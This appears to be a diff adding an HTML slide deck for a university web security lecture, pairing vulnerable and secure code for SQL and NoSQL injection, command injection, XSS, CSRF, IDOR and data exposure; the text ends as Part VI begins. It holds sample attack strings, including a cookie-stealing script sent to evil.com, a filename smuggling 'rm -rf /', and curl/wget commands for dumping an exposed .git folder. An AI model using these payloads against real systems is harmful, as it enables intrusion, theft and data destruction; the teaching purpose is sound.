@@ -1,0 +1,1192 @@
+<!-- LECTURE: Web Security - Front Door Attacks -->
+<!-- Real hacks, common mistakes, and how to defend -->
+
+<!-- ==================== TITLE ==================== -->
+<section class="slide active" data-slide="title">
+    <div class="slide-content title-slide">
+        <div class="title-decoration">
+            <div class="protocol-badge security-badge">SECURITY</div>
+        </div>
+        <h1 class="main-title">
+            <span class="title-line">Web Security</span>
+            <span class="title-line highlight">Front Door</span>
+            <span class="title-line">Attacks</span>
+        </h1>
+        <p class="subtitle">Real Hacks, Stupid Mistakes & How to Defend</p>
+        <div class="title-meta">
+            <div class="meta-item">
+                <span class="meta-label">Course</span>
+                <span class="meta-value">Full Stack Engineering</span>
+            </div>
+            <div class="meta-item">
+                <span class="meta-label">Instructor</span>
+                <span class="meta-value">Ohad Assulin</span>
+            </div>
+        </div>
+        <div class="scroll-hint">
+            <span>Press -> or Space to navigate</span>
+            <div class="arrow-bounce">|</div>
+        </div>
+    </div>
+</section>
+
+<!-- WHY SECURITY MATTERS -->
+<section class="slide" data-slide="why-security">
+    <div class="slide-content">
+        <h3 class="slide-title">Why Security Matters</h3>
+        <div class="breach-stats">
+            <div class="stat-card breach clickable" data-modal="breach-equifax">
+                <div class="breach-year">2017</div>
+                <div class="breach-name">Equifax</div>
+                <div class="breach-impact">147M records</div>
+                <div class="breach-cost">$700M settlement</div>
+                <div class="breach-cause">Unpatched vulnerability</div>
+            </div>
+            <div class="stat-card breach clickable" data-modal="breach-yahoo">
+                <div class="breach-year">2013-14</div>
+                <div class="breach-name">Yahoo</div>
+                <div class="breach-impact">3B accounts</div>
+                <div class="breach-cost">$350M off sale price</div>
+                <div class="breach-cause">Forged cookies</div>
+            </div>
+            <div class="stat-card breach clickable" data-modal="breach-linkedin">
+                <div class="breach-year">2012</div>
+                <div class="breach-name">LinkedIn</div>
+                <div class="breach-impact">165M passwords</div>
+                <div class="breach-cost">$1.25M settlement</div>
+                <div class="breach-cause">Unsalted SHA-1</div>
+            </div>
+            <div class="stat-card breach clickable" data-modal="breach-sony">
+                <div class="breach-year">2011</div>
+                <div class="breach-name">Sony PSN</div>
+                <div class="breach-impact">77M accounts</div>
+                <div class="breach-cost">$171M</div>
+                <div class="breach-cause">SQL Injection</div>
+            </div>
+        </div>
+        <div class="security-quote">
+            <blockquote>"There are only two types of companies: those that have been hacked, and those that don't know they have been hacked."</blockquote>
+            <cite>— John Chambers, former Cisco CEO</cite>
+        </div>
+    </div>
+</section>
+
+<!-- ATTACKER MINDSET -->
+<section class="slide" data-slide="attacker-mindset">
+    <div class="slide-content">
+        <h3 class="slide-title">The Attacker's Mindset</h3>
+        <div class="two-column">
+            <div class="column">
+                <div class="mindset-box attacker">
+                    <h4>What Attackers Look For</h4>
+                    <ul class="attack-vectors">
+                        <li class="clickable" data-modal="vector-input">
+                            <span class="vector-icon">[>]</span>
+                            <span>User input that reaches the database</span>
+                        </li>
+                        <li class="clickable" data-modal="vector-auth">
+                            <span class="vector-icon">[>]</span>
+                            <span>Weak authentication flows</span>
+                        </li>
+                        <li class="clickable" data-modal="vector-access">
+                            <span class="vector-icon">[>]</span>
+                            <span>Direct object references in URLs</span>
+                        </li>
+                        <li class="clickable" data-modal="vector-exposed">
+                            <span class="vector-icon">[>]</span>
+                            <span>Exposed configuration files</span>
+                        </li>
+                        <li class="clickable" data-modal="vector-errors">
+                            <span class="vector-icon">[>]</span>
+                            <span>Verbose error messages</span>
+                        </li>
+                        <li class="clickable" data-modal="vector-outdated">
+                            <span class="vector-icon">[>]</span>
+                            <span>Outdated dependencies</span>
+                        </li>
+                    </ul>
+                </div>
+            </div>
+            <div class="column">
+                <div class="mindset-box defender">
+                    <h4>Defense in Depth</h4>
+                    <div class="defense-layers">
+                        <div class="defense-layer">
+                            <span class="layer-num">1</span>
+                            <span>Input Validation</span>
+                        </div>
+                        <div class="defense-layer">
+                            <span class="layer-num">2</span>
+                            <span>Authentication</span>
+                        </div>
+                        <div class="defense-layer">
+                            <span class="layer-num">3</span>
+                            <span>Authorization</span>
+                        </div>
+                        <div class="defense-layer">
+                            <span class="layer-num">4</span>
+                            <span>Encryption</span>
+                        </div>
+                        <div class="defense-layer">
+                            <span class="layer-num">5</span>
+                            <span>Monitoring</span>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- ==================== PART I: INJECTION ==================== -->
+<section class="slide" data-slide="injection-intro">
+    <div class="slide-content">
+        <div class="part-indicator">Part I</div>
+        <h2 class="section-title">Injection Attacks</h2>
+        <p class="section-subtitle">#1 on OWASP Top 10 for over a decade</p>
+        <div class="decorative-code scary">
+            <pre><code>' OR '1'='1' --</code></pre>
+        </div>
+    </div>
+</section>
+
+<!-- SQL INJECTION BASICS -->
+<section class="slide" data-slide="sql-injection">
+    <div class="slide-content">
+        <h3 class="slide-title">SQL Injection — The Classic</h3>
+        <div class="two-column">
+            <div class="column">
+                <div class="code-showcase bad-example">
+                    <div class="code-tab danger">VULNERABLE CODE</div>
+                    <pre class="code-block"><code>// User input directly in SQL string
+const query = `
+    SELECT * FROM users
+    WHERE username = '${username}'
+    AND password = '${password}'
+`;
+
+// Attacker enters:
+// username: admin' --
+// password: anything
+
+// Resulting query:
+SELECT * FROM users
+WHERE username = 'admin' --'
+AND password = 'anything'
+
+// The -- comments out the rest!
+// Logs in as admin without password!</code></pre>
+                </div>
+            </div>
+            <div class="column">
+                <div class="code-showcase good-example">
+                    <div class="code-tab safe">SECURE CODE</div>
+                    <pre class="code-block"><code>// Parameterized query (prepared statement)
+const query = `
+    SELECT * FROM users
+    WHERE username = $1
+    AND password = $2
+`;
+
+const result = await db.query(query, [
+    username,
+    password
+]);
+
+// The database treats $1 and $2 as DATA
+// not as SQL code — injection impossible!</code></pre>
+                </div>
+                <div class="security-note">
+                    <strong>Rule #1:</strong> NEVER concatenate user input into SQL strings. Always use parameterized queries.
+                </div>
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- SQL INJECTION - REAL ATTACKS -->
+<section class="slide" data-slide="sql-injection-real">
+    <div class="slide-content">
+        <h3 class="slide-title">SQL Injection — Real World Carnage</h3>
+        <div class="attack-timeline">
+            <div class="attack-card clickable" data-modal="sqli-heartland">
+                <div class="attack-year">2008</div>
+                <h4>Heartland Payment Systems</h4>
+                <p>134 million credit cards stolen via SQL injection</p>
+                <div class="attack-result">$140M in damages</div>
+            </div>
+            <div class="attack-card clickable" data-modal="sqli-sony">
+                <div class="attack-year">2011</div>
+                <h4>Sony Pictures</h4>
+                <p>LulzSec stole 1M accounts using basic SQLi</p>
+                <div class="attack-result">Plain text passwords exposed</div>
+            </div>
+            <div class="attack-card clickable" data-modal="sqli-talktalk">
+                <div class="attack-year">2015</div>
+                <h4>TalkTalk</h4>
+                <p>157,000 customers' data stolen by teenager</p>
+                <div class="attack-result">£400K fine, CEO resigned</div>
+            </div>
+        </div>
+        <div class="scary-stat">
+            <div class="stat-number">65%</div>
+            <div class="stat-text">of data breaches involve SQL injection</div>
+        </div>
+    </div>
+</section>
+
+<!-- SQL INJECTION TECHNIQUES -->
+<section class="slide" data-slide="sql-injection-types">
+    <div class="slide-content">
+        <h3 class="slide-title">SQL Injection Techniques</h3>
+        <p class="click-hint">Click any technique for details and examples</p>
+        <div class="technique-grid">
+            <div class="technique-card clickable" data-modal="sqli-union">
+                <h4>UNION Attack</h4>
+                <code>' UNION SELECT * FROM users --</code>
+                <p>Extract data from other tables</p>
+            </div>
+            <div class="technique-card clickable" data-modal="sqli-blind">
+                <h4>Blind SQLi</h4>
+                <code>' AND SUBSTRING(password,1,1)='a' --</code>
+                <p>Infer data from true/false responses</p>
+            </div>
+            <div class="technique-card clickable" data-modal="sqli-time">
+                <h4>Time-Based Blind</h4>
+                <code>' AND SLEEP(5) --</code>
+                <p>Infer from response delay</p>
+            </div>
+            <div class="technique-card clickable" data-modal="sqli-second">
+                <h4>Second-Order</h4>
+                <code>Stored payload triggers later</code>
+                <p>Injection executed in different context</p>
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- NOSQL INJECTION -->
+<section class="slide" data-slide="nosql-injection">
+    <div class="slide-content">
+        <h3 class="slide-title">NoSQL Injection — MongoDB Edition</h3>
+        <div class="two-column">
+            <div class="column">
+                <div class="code-showcase bad-example">
+                    <div class="code-tab danger">VULNERABLE</div>
+                    <pre class="code-block"><code>// Express route with JSON body
+app.post('/login', async (req, res) => {
+    const { username, password } = req.body;
+
+    const user = await db.collection('users').findOne({
+        username: username,
+        password: password
+    });
+});
+
+// Attacker sends:
+{
+    "username": "admin",
+    "password": { "$ne": "" }
+}
+
+// Query becomes:
+// Find user where username = "admin"
+// AND password != ""
+// Bypasses authentication!</code></pre>
+                </div>
+            </div>
+            <div class="column">
+                <div class="code-showcase good-example">
+                    <div class="code-tab safe">SECURE</div>
+                    <pre class="code-block"><code>// Validate input types!
+app.post('/login', async (req, res) => {
+    const { username, password } = req.body;
+
+    // Ensure strings, not objects
+    if (typeof username !== 'string' ||
+        typeof password !== 'string') {
+        return res.status(400).json({
+            error: 'Invalid input'
+        });
+    }
+
+    // Now safe to query
+    const user = await db.collection('users').findOne({
+        username,
+        password: await hash(password)
+    });
+});</code></pre>
+                </div>
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- COMMAND INJECTION -->
+<section class="slide" data-slide="command-injection">
+    <div class="slide-content">
+        <h3 class="slide-title">Command Injection — Shell Shock</h3>
+        <div class="two-column">
+            <div class="column">
+                <div class="code-showcase bad-example">
+                    <div class="code-tab danger">VULNERABLE</div>
+                    <pre class="code-block"><code>// Image resize endpoint
+app.post('/resize', (req, res) => {
+    const { filename, width } = req.body;
+
+    // DANGER: User input in shell command!
+    exec(`convert ${filename} -resize ${width} output.jpg`);
+});
+
+// Attacker sends:
+{
+    "filename": "image.jpg; rm -rf /",
+    "width": "100"
+}
+
+// Executed command:
+// convert image.jpg; rm -rf / -resize 100 output.jpg
+//                    ^^^^^^^^^ DELETES EVERYTHING</code></pre>
+                </div>
+            </div>
+            <div class="column">
+                <div class="code-showcase good-example">
+                    <div class="code-tab safe">SECURE</div>
+                    <pre class="code-block"><code>import { execFile } from 'child_process';
+
+app.post('/resize', (req, res) => {
+    const { filename, width } = req.body;
+
+    // Validate filename (whitelist chars)
+    if (!/^[a-zA-Z0-9_.-]+$/.test(filename)) {
+        return res.status(400).json({
+            error: 'Invalid filename'
+        });
+    }
+
+    // execFile doesn't use shell
+    // Arguments are passed directly
+    execFile('convert', [
+        filename,
+        '-resize', String(width),
+        'output.jpg'
+    ]);
+});</code></pre>
+                </div>
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- ==================== PART II: XSS ==================== -->
+<section class="slide" data-slide="xss-intro">
+    <div class="slide-content">
+        <div class="part-indicator">Part II</div>
+        <h2 class="section-title">Cross-Site Scripting (XSS)</h2>
+        <p class="section-subtitle">When your website attacks your users</p>
+        <div class="decorative-code scary">
+            <pre><code>&lt;script&gt;document.location='http://evil.com/steal?c='+document.cookie&lt;/script&gt;</code></pre>
+        </div>
+    </div>
+</section>
+
+<!-- STORED XSS -->
+<section class="slide" data-slide="xss-stored">
+    <div class="slide-content">
+        <h3 class="slide-title">Stored XSS — The Samy Worm</h3>
+        <div class="two-column">
+            <div class="column">
+                <div class="famous-hack clickable" data-modal="samy-worm">
+                    <div class="hack-header">
+                        <span class="hack-year">2005</span>
+                        <span class="hack-name">MySpace Samy Worm</span>
+                    </div>
+                    <div class="hack-story">
+                        <p>Samy Kamkar created the <strong>fastest spreading virus of all time</strong>.</p>
+                        <ul>
+                            <li>Exploited XSS in MySpace profiles</li>
+                            <li>Added "Samy is my hero" to victims' profiles</li>
+                            <li>Self-replicated to victims' friends</li>
+                            <li><strong>1 million infections in 20 hours</strong></li>
+                        </ul>
+                        <div class="hack-result">MySpace shut down for emergency patching</div>
+                    </div>
+                </div>
+            </div>
+            <div class="column">
+                <div class="code-showcase bad-example">
+                    <div class="code-tab danger">HOW IT WORKED</div>
+                    <pre class="code-block"><code>// User bio saved to database
+const bio = "&lt;script&gt;sendToSamy(document.cookie)&lt;/script&gt;";
+
+// Rendered on profile page (unsanitized)
+&lt;div class="bio"&gt;
+    ${user.bio}  // Script executes!
+&lt;/div&gt;
+
+// Every visitor's cookies stolen
+// Script adds attacker as friend
+// Script copies itself to victim's profile
+// Exponential spread!</code></pre>
+                </div>
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- XSS TYPES -->
+<section class="slide" data-slide="xss-types">
+    <div class="slide-content">
+        <h3 class="slide-title">XSS Attack Types</h3>
+        <p class="click-hint">Click any type for detailed explanation</p>
+        <div class="xss-types-grid">
+            <div class="xss-type-card clickable" data-modal="xss-stored-detail">
+                <div class="xss-icon">[DB]</div>
+                <h4>Stored XSS</h4>
+                <p>Malicious script saved in database, served to all users</p>
+                <div class="xss-danger high">Danger: HIGH</div>
+                <code>Comment, profile, post fields</code>
+            </div>
+            <div class="xss-type-card clickable" data-modal="xss-reflected-detail">
+                <div class="xss-icon">[URL]</div>
+                <h4>Reflected XSS</h4>
+                <p>Script in URL parameter reflected back in response</p>
+                <div class="xss-danger medium">Danger: MEDIUM</div>
+                <code>Search queries, error messages</code>
+            </div>
+            <div class="xss-type-card clickable" data-modal="xss-dom-detail">
+                <div class="xss-icon">[JS]</div>
+                <h4>DOM-Based XSS</h4>
+                <p>Client-side JS writes untrusted data to DOM</p>
+                <div class="xss-danger medium">Danger: MEDIUM</div>
+                <code>innerHTML, document.write</code>
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- XSS PREVENTION -->
+<section class="slide" data-slide="xss-prevention">
+    <div class="slide-content">
+        <h3 class="slide-title">XSS Prevention</h3>
+        <div class="two-column">
+            <div class="column">
+                <div class="code-showcase bad-example">
+                    <div class="code-tab danger">VULNERABLE</div>
+                    <pre class="code-block"><code>// React: dangerouslySetInnerHTML
+&lt;div dangerouslySetInnerHTML={{
+    __html: userInput  // XSS!
+}} /&gt;
+
+// Vanilla JS: innerHTML
+element.innerHTML = userInput;  // XSS!
+
+// jQuery: html()
+$('#output').html(userInput);  // XSS!
+
+// Template literal in HTML
+const html = `&lt;p&gt;${userInput}&lt;/p&gt;`;  // XSS!
+
+// URL without validation
+&lt;a href={userUrl}&gt;Click&lt;/a&gt;
+// javascript:alert(1) works!</code></pre>
+                </div>
+            </div>
+            <div class="column">
+                <div class="code-showcase good-example">
+                    <div class="code-tab safe">SECURE</div>
+                    <pre class="code-block"><code>// React: default escaping (safe!)
+&lt;div&gt;{userInput}&lt;/div&gt;
+
+// Vanilla JS: textContent
+element.textContent = userInput;  // Safe!
+
+// jQuery: text()
+$('#output').text(userInput);  // Safe!
+
+// Sanitize if HTML needed
+import DOMPurify from 'dompurify';
+const clean = DOMPurify.sanitize(userInput);
+
+// Validate URLs
+const url = new URL(userUrl);
+if (!['http:', 'https:'].includes(url.protocol)) {
+    throw new Error('Invalid URL');
+}</code></pre>
+                </div>
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- CSP HEADER -->
+<section class="slide" data-slide="csp">
+    <div class="slide-content">
+        <h3 class="slide-title">Content Security Policy — XSS Killswitch</h3>
+        <div class="code-showcase">
+            <div class="code-tab">HTTP Header</div>
+            <pre class="code-block"><code>Content-Security-Policy:
+    default-src 'self';
+    script-src 'self' https://trusted-cdn.com;
+    style-src 'self' 'unsafe-inline';
+    img-src 'self' data: https:;
+    connect-src 'self' https://api.example.com;
+    frame-ancestors 'none';
+    form-action 'self';</code></pre>
+        </div>
+        <div class="csp-explained">
+            <div class="csp-rule clickable" data-modal="csp-script">
+                <code>script-src 'self'</code>
+                <p>Only scripts from same origin — blocks inline scripts!</p>
+            </div>
+            <div class="csp-rule clickable" data-modal="csp-connect">
+                <code>connect-src 'self' api.example.com</code>
+                <p>Only fetch/XHR to these domains</p>
+            </div>
+            <div class="csp-rule clickable" data-modal="csp-frame">
+                <code>frame-ancestors 'none'</code>
+                <p>Prevents clickjacking — can't be embedded in iframe</p>
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- ==================== PART III: AUTH ==================== -->
+<section class="slide" data-slide="auth-intro">
+    <div class="slide-content">
+        <div class="part-indicator">Part III</div>
+        <h2 class="section-title">Authentication Disasters</h2>
+        <p class="section-subtitle">How companies lose millions of passwords</p>
+        <div class="decorative-code scary">
+            <pre><code>password = "123456"  // Still #1 most common password</code></pre>
+        </div>
+    </div>
+</section>
+
+<!-- PASSWORD STORAGE -->
+<section class="slide" data-slide="password-storage">
+    <div class="slide-content">
+        <h3 class="slide-title">Password Storage — Hall of Shame</h3>
+        <div class="shame-list">
+            <div class="shame-item clickable" data-modal="shame-plaintext">
+                <div class="shame-level">WORST</div>
+                <h4>Plain Text</h4>
+                <code>password = "hunter2"</code>
+                <p>RockYou (2009): 32M passwords in plain text</p>
+            </div>
+            <div class="shame-item clickable" data-modal="shame-md5">
+                <div class="shame-level bad">BAD</div>
+                <h4>MD5 Hash</h4>
+                <code>MD5("hunter2") = "2ab96390...</code>
+                <p>LinkedIn (2012): MD5 without salt, cracked in hours</p>
+            </div>
+            <div class="shame-item clickable" data-modal="shame-sha1">
+                <div class="shame-level bad">BAD</div>
+                <h4>SHA-1 Unsalted</h4>
+                <code>SHA1("hunter2") = "a8a00add..."</code>
+                <p>Adobe (2013): 150M accounts, same password = same hash</p>
+            </div>
+            <div class="shame-item good clickable" data-modal="shame-bcrypt">
+                <div class="shame-level good">GOOD</div>
+                <h4>bcrypt/Argon2</h4>
+                <code>$2b$12$LQv3c1yqBWVHxkd0LHAkCOYz6...</code>
+                <p>Slow, salted, designed for passwords</p>
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- PROPER PASSWORD HASHING -->
+<section class="slide" data-slide="password-hashing">
+    <div class="slide-content">
+        <h3 class="slide-title">Proper Password Hashing</h3>
+        <div class="two-column">
+            <div class="column">
+                <div class="code-showcase bad-example">
+                    <div class="code-tab danger">WRONG</div>
+                    <pre class="code-block"><code>// Plain text (NEVER!)
+db.insert({ password: userPassword });
+
+// Simple hash (BROKEN!)
+const hash = crypto
+    .createHash('sha256')
+    .update(password)
+    .digest('hex');
+
+// Problems:
+// 1. Rainbow tables crack common passwords
+// 2. Same password = same hash
+// 3. Too fast — billions of guesses/sec
+// 4. No defense against GPU cracking</code></pre>
+                </div>
+            </div>
+            <div class="column">
+                <div class="code-showcase good-example">
+                    <div class="code-tab safe">CORRECT</div>
+                    <pre class="code-block"><code>import bcrypt from 'bcrypt';
+
+// Registration
+const saltRounds = 12;  // Cost factor
+const hash = await bcrypt.hash(password, saltRounds);
+db.insert({ passwordHash: hash });
+
+// Login
+const isValid = await bcrypt.compare(
+    inputPassword,
+    user.passwordHash
+);
+
+// Why bcrypt works:
+// 1. Random salt per password
+// 2. Intentionally slow (~100ms)
+// 3. Cost factor increases over time
+// 4. Resistant to GPU attacks</code></pre>
+                </div>
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- SESSION SECURITY -->
+<section class="slide" data-slide="session-security">
+    <div class="slide-content">
+        <h3 class="slide-title">Session Security</h3>
+        <div class="session-attacks">
+            <div class="attack-box clickable" data-modal="session-hijack">
+                <h4>Session Hijacking</h4>
+                <div class="attack-flow">
+                    <span>Attacker steals session cookie</span>
+                    <span class="flow-arrow">-></span>
+                    <span>Impersonates user</span>
+                </div>
+                <div class="defense">
+                    <strong>Defense:</strong> HttpOnly, Secure flags, short expiry
+                </div>
+            </div>
+            <div class="attack-box clickable" data-modal="session-fixation">
+                <h4>Session Fixation</h4>
+                <div class="attack-flow">
+                    <span>Attacker sets victim's session ID</span>
+                    <span class="flow-arrow">-></span>
+                    <span>Victim logs in</span>
+                    <span class="flow-arrow">-></span>
+                    <span>Attacker uses same session</span>
+                </div>
+                <div class="defense">
+                    <strong>Defense:</strong> Regenerate session ID on login
+                </div>
+            </div>
+        </div>
+        <div class="code-showcase compact">
+            <div class="code-tab safe">Secure Cookie Settings</div>
+            <pre class="code-block"><code>res.cookie('session', sessionId, {
+    httpOnly: true,    // No JavaScript access
+    secure: true,      // HTTPS only
+    sameSite: 'strict', // No cross-site sending
+    maxAge: 3600000    // 1 hour expiry
+});</code></pre>
+        </div>
+    </div>
+</section>
+
+<!-- CSRF -->
+<section class="slide" data-slide="csrf">
+    <div class="slide-content">
+        <h3 class="slide-title">CSRF — Cross-Site Request Forgery</h3>
+        <div class="two-column">
+            <div class="column">
+                <div class="csrf-attack clickable" data-modal="csrf-detail">
+                    <h4>The Attack</h4>
+                    <div class="attack-scenario">
+                        <div class="scenario-step">
+                            <span class="step-num">1</span>
+                            <span>User logged into bank.com</span>
+                        </div>
+                        <div class="scenario-step">
+                            <span class="step-num">2</span>
+                            <span>User visits evil.com</span>
+                        </div>
+                        <div class="scenario-step">
+                            <span class="step-num">3</span>
+                            <span>evil.com has hidden form:</span>
+                        </div>
+                    </div>
+                    <pre class="mini-code"><code>&lt;form action="bank.com/transfer" method="POST"&gt;
+  &lt;input name="to" value="attacker"&gt;
+  &lt;input name="amount" value="10000"&gt;
+&lt;/form&gt;
+&lt;script&gt;document.forms[0].submit()&lt;/script&gt;</code></pre>
+                    <div class="scenario-step">
+                        <span class="step-num">4</span>
+                        <span>Browser sends user's cookies!</span>
+                    </div>
+                </div>
+            </div>
+            <div class="column">
+                <div class="csrf-defense">
+                    <h4>Defense Strategies</h4>
+                    <div class="defense-item clickable" data-modal="csrf-token">
+                        <strong>CSRF Tokens</strong>
+                        <p>Random token in form, verified server-side</p>
+                    </div>
+                    <div class="defense-item clickable" data-modal="csrf-samesite">
+                        <strong>SameSite Cookies</strong>
+                        <p>Cookie not sent on cross-site requests</p>
+                    </div>
+                    <div class="defense-item clickable" data-modal="csrf-origin">
+                        <strong>Origin Header Check</strong>
+                        <p>Verify request origin matches</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- ==================== PART IV: ACCESS CONTROL ==================== -->
+<section class="slide" data-slide="access-intro">
+    <div class="slide-content">
+        <div class="part-indicator">Part IV</div>
+        <h2 class="section-title">Broken Access Control</h2>
+        <p class="section-subtitle">When "just change the ID" works</p>
+        <div class="decorative-code scary">
+            <pre><code>/api/users/123/documents  ->  /api/users/124/documents</code></pre>
+        </div>
+    </div>
+</section>
+
+<!-- IDOR -->
+<section class="slide" data-slide="idor">
+    <div class="slide-content">
+        <h3 class="slide-title">IDOR — Insecure Direct Object Reference</h3>
+        <div class="two-column">
+            <div class="column">
+                <div class="code-showcase bad-example">
+                    <div class="code-tab danger">VULNERABLE</div>
+                    <pre class="code-block"><code>// API endpoint
+app.get('/api/invoices/:id', async (req, res) => {
+    const invoice = await Invoice.findById(req.params.id);
+    res.json(invoice);
+});
+
+// User requests their invoice
+GET /api/invoices/1001
+
+// Attacker changes ID
+GET /api/invoices/1002  // Someone else's!
+GET /api/invoices/1003  // Another one!
+
+// No authorization check = data breach</code></pre>
+                </div>
+                <div class="idor-examples">
+                    <h5>Real IDOR Bugs</h5>
+                    <ul>
+                        <li>Panera Bread: 37M customer records</li>
+                        <li>US Army: Soldier medical records</li>
+                        <li>Instagram: Any account photos</li>
+                    </ul>
+                </div>
+            </div>
+            <div class="column">
+                <div class="code-showcase good-example">
+                    <div class="code-tab safe">SECURE</div>
+                    <pre class="code-block"><code>// Always verify ownership!
+app.get('/api/invoices/:id', async (req, res) => {
+    const invoice = await Invoice.findOne({
+        _id: req.params.id,
+        userId: req.user.id  // Must belong to user!
+    });
+
+    if (!invoice) {
+        return res.status(404).json({
+            error: 'Invoice not found'
+        });
+    }
+
+    res.json(invoice);
+});
+
+// Or use UUIDs instead of sequential IDs
+// Harder to guess: /api/invoices/f47ac10b-58cc-...</code></pre>
+                </div>
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- PRIVILEGE ESCALATION -->
+<section class="slide" data-slide="privilege-escalation">
+    <div class="slide-content">
+        <h3 class="slide-title">Privilege Escalation</h3>
+        <div class="escalation-types">
+            <div class="escalation-card clickable" data-modal="priv-horizontal">
+                <h4>Horizontal Escalation</h4>
+                <div class="escalation-diagram">
+                    <span class="user-level">User A</span>
+                    <span class="escalation-arrow">-></span>
+                    <span class="user-level">User B's data</span>
+                </div>
+                <p>Access other users' resources at same privilege level</p>
+                <code>IDOR, parameter tampering</code>
+            </div>
+            <div class="escalation-card clickable" data-modal="priv-vertical">
+                <h4>Vertical Escalation</h4>
+                <div class="escalation-diagram">
+                    <span class="user-level">Regular User</span>
+                    <span class="escalation-arrow">-></span>
+                    <span class="user-level admin">Admin</span>
+                </div>
+                <p>Gain higher privileges than assigned</p>
+                <code>role=admin in request, hidden endpoints</code>
+            </div>
+        </div>
+        <div class="code-showcase bad-example compact">
+            <div class="code-tab danger">Classic Mistake</div>
+            <pre class="code-block"><code>// Trusting client-side role
+app.post('/api/users', (req, res) => {
+    const user = {
+        name: req.body.name,
+        email: req.body.email,
+        role: req.body.role  // Attacker sends role: "admin"!
+    };
+});</code></pre>
+        </div>
+    </div>
+</section>
+
+<!-- ==================== PART V: DATA EXPOSURE ==================== -->
+<section class="slide" data-slide="exposure-intro">
+    <div class="slide-content">
+        <div class="part-indicator">Part V</div>
+        <h2 class="section-title">Sensitive Data Exposure</h2>
+        <p class="section-subtitle">The stupid mistakes that leak everything</p>
+        <div class="decorative-code scary">
+            <pre><code>console.log("User password:", user.password);  // In production logs</code></pre>
+        </div>
+    </div>
+</section>
+
+<!-- STUPID MISTAKES -->
+<section class="slide" data-slide="stupid-mistakes">
+    <div class="slide-content">
+        <h3 class="slide-title">Developer Mistakes — Greatest Hits</h3>
+        <p class="click-hint">Click any mistake for the horror story</p>
+        <div class="mistakes-grid">
+            <div class="mistake-card clickable" data-modal="mistake-git">
+                <div class="mistake-icon">[.git]</div>
+                <h4>Exposed .git folder</h4>
+                <p>Full source code + history downloadable</p>
+                <code>/.git/config</code>
+            </div>
+            <div class="mistake-card clickable" data-modal="mistake-env">
+                <div class="mistake-icon">[.env]</div>
+                <h4>Committed .env file</h4>
+                <p>API keys, DB passwords in repo</p>
+                <code>AWS_SECRET_KEY=...</code>
+            </div>
+            <div class="mistake-card clickable" data-modal="mistake-logs">
+                <div class="mistake-icon">[LOG]</div>
+                <h4>Secrets in logs</h4>
+                <p>Passwords, tokens logged in plain text</p>
+                <code>console.log(req.body)</code>
+            </div>
+            <div class="mistake-card clickable" data-modal="mistake-url">
+                <div class="mistake-icon">[URL]</div>
+                <h4>Secrets in URLs</h4>
+                <p>Tokens in query strings, logged everywhere</p>
+                <code>?token=abc123</code>
+            </div>
+            <div class="mistake-card clickable" data-modal="mistake-error">
+                <div class="mistake-icon">[ERR]</div>
+                <h4>Verbose errors</h4>
+                <p>Stack traces, SQL queries exposed</p>
+                <code>Error: SELECT * FROM users WHERE...</code>
+            </div>
+            <div class="mistake-card clickable" data-modal="mistake-backup">
+                <div class="mistake-icon">[BAK]</div>
+                <h4>Backup files exposed</h4>
+                <p>Database dumps, config backups</p>
+                <code>/backup.sql, /config.php.bak</code>
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- GIT EXPOSURE -->
+<section class="slide" data-slide="git-exposure">
+    <div class="slide-content">
+        <h3 class="slide-title">.git Exposure — Download Any Website's Source</h3>
+        <div class="two-column">
+            <div class="column">
+                <div class="attack-demo">
+                    <h4>The Attack</h4>
+                    <pre class="code-block"><code># Check if .git is exposed
+curl https://target.com/.git/config
+
+# If 200 OK, download everything:
+wget --mirror --include-directories=/.git \
+     https://target.com/.git/
+
+# Reconstruct source code
+git checkout -- .
+
+# Now you have:
+# - All source code
+# - All commit history
+# - All branches
+# - Possibly hardcoded secrets</code></pre>
+                </div>
+            </div>
+            <div class="column">
+                <div class="exposure-stats">
+                    <div class="stat-highlight">
+                        <div class="stat-number">390,000+</div>
+                        <div class="stat-label">websites with exposed .git</div>
+                        <div class="stat-source">— 2018 Study</div>
+                    </div>
+                </div>
+                <div class="code-showcase good-example compact">
+                    <div class="code-tab safe">Prevention (Nginx)</div>
+                    <pre class="code-block"><code># Block access to hidden files
+location ~ /\. {
+    deny all;
+    return 404;
+}</code></pre>
+                </div>
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- API KEYS -->
+<section class="slide" data-slide="api-key-leak">
+    <div class="slide-content">
+        <h3 class="slide-title">API Key Leaks — The $50,000 Mistake</h3>
+        <div class="api-key-story clickable" data-modal="api-key-horror">
+            <div class="story-header">
+                <span class="story-icon">[!]</span>
+                <span class="story-title">True Story: AWS Keys on GitHub</span>
+            </div>
+            <div class="story-timeline">
+                <div class="timeline-event">
+                    <span class="event-time">0:00</span>
+                    <span>Developer pushes code with AWS keys</span>
+                </div>
+                <div class="timeline-event">
+                    <span class="event-time">0:15</span>
+                    <span>Bot scans GitHub, finds keys</span>
+                </div>
+                <div class="timeline-event">
+                    <span class="event-time">0:30</span>
+                    <span>Attacker spins up 200 EC2 instances</span>
+                </div>
+                <div class="timeline-event">
+                    <span class="event-time">12:00</span>
+                    <span>Developer gets $50,000 AWS bill</span>
+                </div>
+            </div>
+        </div>
+        <div class="prevention-tips">
+            <h4>Prevention</h4>
+            <div class="tip-grid">
+                <div class="tip">
+                    <code>.gitignore</code>
+                    <p>Never commit .env files</p>
+                </div>
+                <div class="tip">
+                    <code>git-secrets</code>
+                    <p>Pre-commit hook to scan for secrets</p>
+                </div>
+                <div class="tip">
+                    <code>Environment variables</code>
+                    <p>Inject secrets at runtime</p>
+                </div>
+                <div class="tip">
+                    <code>Secret managers</code>
+                    <p>AWS Secrets Manager, Vault</p>
+                </div>
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- ==================== PART VI: DEFENSE ==================== -->
+<section class="slide" data-slide="defense-intro">
+    <div class="slide-content">
